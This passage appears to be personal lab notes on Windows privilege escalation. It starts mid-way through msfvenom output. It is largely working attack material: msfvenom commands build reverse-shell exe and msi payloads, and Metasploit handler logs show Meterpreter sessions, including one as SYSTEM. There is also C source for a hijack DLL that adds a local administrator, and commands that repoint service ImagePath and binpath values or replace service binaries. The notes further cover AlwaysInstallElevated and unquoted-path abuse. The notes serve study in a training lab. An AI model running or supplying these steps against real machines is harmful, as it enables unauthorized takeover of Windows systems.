[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe
```

start listener:

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_
[-] The value specified for payload is not valid.
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.8.147.132
lhost => 10.8.147.132
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.147.132     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.147.132:4444
[*] Sending stage (175174 bytes) to 10.10.111.63
[*] Meterpreter session 1 opened (10.8.147.132:4444 -> 10.10.111.63:49230) at 2021-05-08 09:44:21 +0200
```

we got shell!

```
meterpreter > getuid
Server username: TCM-PC\TCM
meterpreter > getsystem
[-] 2001: Operation failed: This function is not supported on this system. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
meterpreter >
```

## Always Installed Elevated

Open command prompt and type

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

From the output, notice that "AlwaysInstallElevated" value is 1.

In command prompt type

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

From the output, notice that "AlwaysInstallElevated" value is 1.

Powershell script Invoke-AllChecks is also capable of detect "AlwaysInstalledElevated"


Powerup script "Write-User AddMSI" creates file UserADD.msi that adds local administrator.

to check:

```
net localgroup administrators
```

or, you can create a msi file that launch reverse shell:

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.8.147.132
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.147.132:4444
```

```
root@kali:~/tcm/WindowsPrivEsc/AutoRun# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.147.132 -f msi -o setup.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: setup.msi
```

shell system!

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.147.132:4444
[*] Sending stage (175174 bytes) to 10.10.111.63
[*] Meterpreter session 1 opened (10.8.147.132:4444 -> 10.10.111.63:49281) at 2021-05-08 10:10:45 +0200


meterpreter >
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

## Service escalation

Open powershell prompt and type

```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

Notice that the output suggests that user belong to "NT AUTHORITY\INTERACTIVE" has "FullContol" permission over the registry key.

```
NT AUTHORITY\INTERACTIVE Allow FullControl
```

we need to create a fake service that add local administrator

windows_service.c

replace "system" function with

```
cmd.exe /k net localgroup administrators user /add
```

compile

```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

put in c:\temp

register service:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```

```
sc start regsvc
```

we should find our user in local administrators.


## Executable files


we need to find a file with everyone access:

```
accesschk64.exe -wvu ...nomefile
```

replace that file with our fake exe that add a local administrator

```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```

```
sc start filepermsvc
```

```
net local administrators
```


## Startup Applications

check if we have permission:

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

BUILTIN\users:(F) <-- F = full access

we can add a file that spawns reverse shell

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

## DLL Hijacking

use procmon (sysinternals) and configure a filter like:

```
result = "NAME NOT FOUND"
```

and

```
end with = ".dll"
```

once we found a "ghost" dll (which has some reference but it is NOT present), we compile a fake one:

windows_dll.c

```
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

compile

```
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

save in c:\temp

```
sc stop dllsvc

sc start dllsvc
```

## Service Permissions and path

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```

to check services with everyone write access 

to check details:

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsv
```

we can replace service configuration with binpath that add local administrator

```
sc config daclsvc binpath= "net localgroup administrators user /add"
```

```
sc start daclsvc
```


## Unquoted service path

check for "unquoted" services

eg. we find "blahservice"

```
sc qc blahservice
```

```
BINARY_PATH_NAME = C:\Program Files\Unquoted Path Service\Common Files\unquotedservice.exe
```

that means: when service blah is started, OS will look in paths:

```
c:\program.exe
c:\program files.exe
C:\Program Files\Unquoted Path Service\Common.exe
```

```
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

```
sc start blahservice
```

result? This file will be executed!

```
C:\Program Files\Unquoted Path Service\Common.exe
```

## CVE-2019-1388

https://www.youtube.com/watch?v=3BQKpPNlTSo

https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388/

## Rogue Potato

https://github.com/antonioCoco/RoguePotato

